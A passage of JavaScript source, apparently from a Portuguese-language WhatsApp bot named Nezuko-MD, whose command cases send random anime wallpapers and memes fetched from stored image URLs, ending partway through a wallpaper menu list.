var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperamarelo`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://telegra.ph/file/0e2989e6947b464fa66b8.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpaperrosa': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/wallpaperosa.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperosa`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://telegra.ph/file/0e2989e6947b464fa66b8.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© _Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'outroshitpost':
reply(`<❗> ${command} enviado no seu pv`)
data = fs.readFileSync('./funções de cmd/imgs/memes/outroshitpost.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
nezuko.sendMessage(m.sender, {image: imagem, caption: `aqui está o seu ${command} ${pushname}\n\ngostou?` },{quoted: dnselo})
break

case 'memesdasam':
reply(`<❗> ${command} enviado no seu pv`)
data = fs.readFileSync('./funções de cmd/imgs/memes/memesdasam.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
nezuko.sendMessage(m.sender, {image: imagem, caption: `aqui está o seu ${command} ${pushname}\n\ngostou?` },{quoted: dnselo})
break

case 'shitpost':
reply(`<❗> ${command} enviado no seu pv`)
data = fs.readFileSync('./funções de cmd/imgs/memes/shitpost.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
nezuko.sendMessage(m.sender, {image: imagem, caption: `aqui está o seu ${command} ${pushname}\n\ngostou?` },{quoted: dnselo})
break

case 'wallpapershinobu': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/shinobu.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpapershinobu`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/SHINOBU/fb10ed54c286b52d7e5f22f5b465274c.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpaperobanai': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/obanai.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperobanai`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/OBANAI/f437d7615e55a1804f637f7151769ee9.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpapergyutaro': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/gyutaro.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpapergyutaro`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/GYUTARO/fdcde69d36595bfd6b7671adcd510761.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpaperaoi': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/aoi.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperaoi`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/AOI/ffd8282a82aece8ce698a343a0790f3d.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpapertomioka': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/tomioka.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpapertomioka`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/TOMIOKA/f9572e842eb8b67f089c259459394b35.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpaperuzui': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/uzui.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperuzui`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/UZUI/f67c5a0a822808ac770ad49472ccc14f.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpapermitsuri': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/mitsuri.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpapermitsuri`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/MITSURI/fd16399b5c80072c8deee4f87bf5993e.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpaperdaki': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/daki.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperdaki`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/DAKI/fb8d18f68edd43d1ef752337784cf98f.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpaperkanao': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/kanao.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperkanao`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/KANAO/fbe10876319abaabc0a63f53f2121904.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpapergyenia': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/gyenia.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpapergyenia`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/GYENIA/fe251cb53add17e1aa7509d59d8490f9.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpapertamayo': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/tamayo.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpapertamayo`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/TAMAYO/ffb690c3d847c4e7bd539b5bd81d2271.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpaperdouma': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/douma.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperdouma`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/DOUMA/f75946301ba1edd8934d50aa8b1ffc58.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpapersanemi': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/sanemi.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpapersanemi`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/SANEMI/ffcb83d47e6fcaad697077c139a37890.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpapertokito': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/tokito.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpapertokito`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/TOKITO/ffac2e76c9de3818aca9c4032a109084.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpapernezuko': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/nezuko.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpapernezuko`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/NEZUKO/e4f78ec55881a632e4e1cc3948a970c9.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpaperenmu': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/enmu.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperenmu`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/ENMU/ff9f048986711075883534c60efb3787.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpaperinosuke': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/inosuke.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperinosuke`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/INOSUKE/f8ecfcc2bb25199ad05f83586517adc1.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpapermuzan': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/muzan.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpapermuzan`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/MUZAN/f4c5e0ea5adc28e758506648e1f08107.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpaperkokushibou': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/kokushibou.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperkokushibou`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/KOKUSHIBOU/fdebc314e66ab36f00eb5f8705f21d2b.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpaperzenitsu': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/zenitsu.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperzenitsu`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/ZENITSU/fda6066353d57465fac5b029a6afa082.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpapertanjiro': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/tanjiro.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpapertanjiro`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/TANJIRO/0ee8d9c8ab5e795f4cc6d96dd5c65e8f.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpaperakaza': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/akaza.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperakaza`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/AKAZA/f637dd31731a8117a33ec5da8e335352.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpapergyomei': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/gyomei.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpapergyomei`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/GYOMEI/f4369b05134a1b3c2da0b548b876c112.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpaperkyonjuro': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/kyonjuro.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperkyonjuro`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/KYONJURO/f8d355a9b7b68cebe6f3212c604617d3.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

//By Daniel >\<
case 'menuwall': case 'menuwallpaper': {
	timestampe = speed();
latensie = speed() - timestampe
uptime = process.uptime()
sections = [
{
title: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿",
rows: [
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐒𝐇𝐈𝐍𝐎𝐁𝐔", rowId: `${prefix}wallpapershinobu`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐎𝐁𝐀𝐍𝐀𝐈", rowId: `${prefix}wallpaperobanai`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐆𝐘𝐔𝐓𝐀𝐑𝐎", rowId: `${prefix}wallpapergyutaro`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐀𝐎𝐈", rowId: `${prefix}wallpaperaoi`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐓𝐎𝐌𝐈𝐎𝐊𝐀", rowId: `${prefix}wallpapertomioka`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐌𝐈𝐓𝐒𝐔𝐑𝐈", rowId: `${prefix}wallpapermitsuri`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐃𝐀𝐊𝐈", rowId: `${prefix}wallpaperdaki`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐊𝐀𝐍𝐀𝐎", rowId: `${prefix}wallpaperkanao`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐆𝐘𝐄𝐍𝐈𝐀", rowId: `${prefix}wallpapergyenia`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐓𝐀𝐌𝐀𝐘𝐎", rowId: `${prefix}wallpapertamayo`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐃𝐎𝐔𝐌𝐀", rowId: `${prefix}wallpaperdouma`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐒𝐀𝐍𝐄𝐌𝐈", rowId: `${prefix}wallpapersanemi`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐓𝐎𝐊𝐈𝐓𝐎", rowId: `${prefix}wallpapertokito`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐍𝐄𝐙𝐔𝐊𝐎", rowId: `${prefix}wallpapernezuko`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐄𝐍𝐌𝐔", rowId: `${prefix}wallpaperenmu`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
